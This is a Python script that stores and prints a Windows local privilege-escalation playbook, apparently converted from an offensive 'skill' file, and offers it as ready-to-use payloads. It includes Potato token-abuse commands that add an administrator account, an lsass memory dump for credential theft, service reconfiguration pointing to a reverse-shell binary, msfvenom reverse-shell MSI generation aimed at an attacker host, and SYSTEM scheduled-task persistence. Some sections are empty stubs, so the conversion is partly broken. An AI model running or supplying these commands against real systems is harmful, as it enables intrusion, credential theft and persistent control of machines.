#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/windows-privilege-escalation

Skill: SKILL: Windows Local Privilege Escalation — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-windows-privilege-escalation.py --help
      python hack-skills-windows-privilege-escalation.py --list
      python hack-skills-windows-privilege-escalation.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/windows-privilege-escalation'
TITLE = 'SKILL: Windows Local Privilege Escalation — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: windows-privilege-escalation", "description: >-", "Windows local privilege escalation playbook. Use when you have low-privilege shell access on Windows and need to escalate via token abuse, Potato exploits, service misconfigurations, DLL hijacking, UAC bypass, or registry autoruns."],
    'skill-windows-local-privilege-escalation-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after escalation for pivoting to other hosts", "- [windows-av-evasion](../windows-av-evasion/SKILL.md) when AV/EDR blocks your privesc tools", "- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) when the host is domain-joined and you need AD-level escalation", "- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for domain privilege escalation via ACL misconfigurations"],
    'advanced-reference': ["Also load [TOKEN_POTATO_TRICKS.md](./TOKEN_POTATO_TRICKS.md) when you need:", "- Detailed Potato family comparison (JuicyPotato \u2192 GodPotato evolution)", "- OS-version-specific exploit selection", "- Required privileges and protocol details per variant", "Also load [UAC_BYPASS_METHODS.md](./UAC_BYPASS_METHODS.md) when you need:", "- UAC bypass technique matrix (fodhelper, eventvwr, sdclt, etc.)", "- Auto-elevate binary abuse", "- Mock trusted directory tricks"],
    '1-enumeration-checklist': [],
    'system-context': ["```cmd", "whoami /all                        & REM Current user, groups, privileges", "systeminfo                         & REM OS version, hotfixes, architecture", "hostname                           & REM Machine name", "net user %USERNAME%                & REM Group memberships"],
    'token-privileges-critical': ["```cmd", "whoami /priv"],
    'services-scheduled-tasks': ["```cmd", "sc query state= all                & REM All services", "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\"", "schtasks /query /fo LIST /v        & REM Verbose scheduled task list"],
    'installed-software-patches': ["```cmd", "wmic product get name,version", "wmic qfe list                      & REM Installed patches"],
    'network-credentials': ["```cmd", "netstat -ano                       & REM Listening ports + PIDs", "cmdkey /list                       & REM Stored credentials", "dir C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\*", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2>nul"],
    '2-token-manipulation-potato-exploits': [],
    'seimpersonateprivilege-abuse': ["Service accounts (IIS AppPool, MSSQL, etc.) typically hold `SeImpersonatePrivilege`. This enables impersonation of any token presented to you.", "```cmd"],
    'printspoofer-simplest-for-modern-systems': ["PrintSpoofer64.exe -i -c \"cmd /c whoami\""],
    'godpotato-broadest-compatibility': ["GodPotato.exe -cmd \"cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add\""],
    'juicypotato-legacy-systems': ["JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c whoami\" -t * -c {CLSID}"],
    'sedebugprivilege-abuse': ["```powershell"],
    'dump-lsass-if-sedebugprivilege-is-enabled': ["procdump -ma lsass.exe lsass.dmp"],
    'or-migrate-into-a-system-process': [],
    'meterpreter-migrate-to-winlogon-exe-services-exe': [],
    '3-service-misconfigurations': [],
    'unquoted-service-paths': ["```cmd"],
    'find-unquoted-paths-with-spaces': ["wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"", "If path is `C:\\Program Files\\My App\\service.exe`, Windows tries:", "1. `C:\\Program.exe`", "2. `C:\\Program Files\\My.exe`", "3. `C:\\Program Files\\My App\\service.exe`", "Place malicious binary at first writable location."],
    'weak-service-permissions': ["```cmd"],
    'check-service-acl-with-accesschk-sysinternals': ["accesschk64.exe -wuvc * /accepteula"],
    'look-for-service-change-config-service-all-access': ["```cmd"],
    'reconfigure-service-to-run-attacker-binary': ["sc config vuln_svc binpath= \"C:\\temp\\rev.exe\"", "sc stop vuln_svc", "sc start vuln_svc"],
    'writable-service-binaries': ["```cmd"],
    'check-if-current-user-can-write-to-the-service-binary-path': ["icacls \"C:\\Program Files\\VulnApp\\service.exe\""],
    'f-full-m-modify-w-write-replace-binary': [],
    '4-dll-hijacking': [],
    'dll-search-order-standard': ["1. Directory of the executable", "2. `C:\\Windows\\System32`", "3. `C:\\Windows\\System`", "4. `C:\\Windows`", "5. Current directory", "6. Directories in `%PATH%`"],
    'exploitation': ["```cmd"],
    'find-missing-dlls-use-process-monitor': [],
    'filter-result-name-not-found-path-ends-with-dll': [],
    'compile-malicious-dll': [],
    'msfvenom-p-windows-x64-shell-reverse-tcp-lhost-attacker-lport-4444-f-dll-evil-dll': [],
    'place-in-writable-directory-that-comes-before-the-real-dll-location': [],
    'known-phantom-dll-targets': [],
    '5-alwaysinstallelevated': ["```cmd"],
    'check-both-registry-keys-both-must-be-set-to-1': ["reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "```cmd"],
    'generate-msi-payload': ["msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > evil.msi", "msiexec /quiet /qn /i evil.msi"],
    '6-scheduled-task-abuse': ["```cmd"],
    'enumerate-tasks-with-writable-scripts-or-missing-binaries': ["schtasks /query /fo LIST /v | findstr /i \"Task To Run\\|Run As User\\|Schedule Type\""],
    'check-permissions-on-task-binary': ["icacls \"C:\\path\\to\\task\\binary.exe\""],
    'if-writable-replace-binary-wait-for-task-execution': [],
    'if-missing-place-your-binary-at-the-expected-path': [],
    'scheduled-task-via-powershell': ["```powershell"],
    'if-you-can-create-tasks-unlikely-from-low-priv-useful-post-uac-bypass': ["$action = New-ScheduledTaskAction -Execute \"C:\\temp\\rev.exe\"", "$trigger = New-ScheduledTaskTrigger -AtLogon", "Register-ScheduledTask -TaskName \"Updater\" -Action $action -Trigger $trigger -User \"SYSTEM\""],
    '7-registry-autoruns': ["```cmd"],
    'check-writable-autorun-locations': ["reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"],
    'check-permissions-with-accesschk': ["accesschk64.exe -wvu \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /accepteula", "If an autorun entry points to a writable path \u2192 replace binary or inject new entry."],
    '8-named-pipe-impersonation': ["```powershell"],
    'service-account-creates-a-named-pipe-tricks-a-system-process-into-connecting': [],
    'the-connecting-client-s-token-is-then-impersonated': [],
    'printspoofer-leverages-this-with-the-print-spooler': ["PrintSpoofer64.exe -i -c powershell.exe", "Custom named pipe server (requires SeImpersonatePrivilege):", "```powershell"],
    'create-pipe-coerce-system-connection-impersonatenamedpipeclient-system-token': [],
    '9-automated-tools': [],
    '10-privilege-escalation-decision-tree': ["Low-privilege shell on Windows", "\u251c\u2500\u2500 whoami /priv \u2192 SeImpersonatePrivilege?", "\u2502   \u251c\u2500\u2500 Yes \u2192 Potato family (\u00a72)", "\u2502   \u2502   \u251c\u2500\u2500 Server2019+/Win11 \u2192 GodPotato or PrintSpoofer", "\u2502   \u2502   \u251c\u2500\u2500 Server2016/Win10 \u2192 PrintSpoofer or SweetPotato", "\u2502   \u2502   \u2514\u2500\u2500 Older \u2192 JuicyPotato (need CLSID)", "\u2502   \u2514\u2500\u2500 SeDebugPrivilege? \u2192 LSASS dump / process injection", "\u251c\u2500\u2500 Service misconfigurations?", "\u2502   \u251c\u2500\u2500 Unquoted path with spaces + writable dir? \u2192 binary plant (\u00a73)", "\u2502   \u251c\u2500\u2500 SERVICE_CHANGE_CONFIG on service? \u2192 reconfigure binpath (\u00a73)", "\u2502   \u2514\u2500\u2500 Writable service binary? \u2192 replace executable (\u00a73)", "\u251c\u2500\u2500 DLL hijacking opportunity?", "\u2502   \u251c\u2500\u2500 Missing DLL in search path? \u2192 plant malicious DLL (\u00a74)", "\u2502   \u2514\u2500\u2500 Writable directory in %PATH%? \u2192 DLL plant (\u00a74)", "\u251c\u2500\u2500 AlwaysInstallElevated set?", "\u2502   \u2514\u2500\u2500 Both HKLM+HKCU = 1 \u2192 MSI payload (\u00a75)", "\u251c\u2500\u2500 Scheduled task abuse?", "\u2502   \u251c\u2500\u2500 Task runs as SYSTEM with writable binary? \u2192 replace (\u00a76)", "\u2502   \u2514\u2500\u2500 Task references missing binary? \u2192 plant binary (\u00a76)", "\u251c\u2500\u2500 Registry autorun writable?", "\u2502   \u2514\u2500\u2500 Writable binary path \u2192 replace on next login/reboot (\u00a77)", "\u251c\u2500\u2500 UAC bypass needed? (medium integrity \u2192 high integrity)", "\u2502   \u2514\u2500\u2500 Load UAC_BYPASS_METHODS.md", "\u251c\u2500\u2500 Stored credentials?", "\u2502   \u251c\u2500\u2500 cmdkey /list \u2192 runas /savecred", "\u2502   \u251c\u2500\u2500 Autologon in registry? \u2192 plaintext creds", "\u2502   \u2514\u2500\u2500 WiFi passwords, browser creds, DPAPI", "\u2514\u2500\u2500 None of the above?", "\u251c\u2500\u2500 Run winPEAS for comprehensive scan", "\u251c\u2500\u2500 Check internal services (netstat -ano)", "\u251c\u2500\u2500 Look for sensitive files (unattend.xml, web.config, *.config)", "\u2514\u2500\u2500 Check for kernel exploits (systeminfo \u2192 Windows Exploit Suggester)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()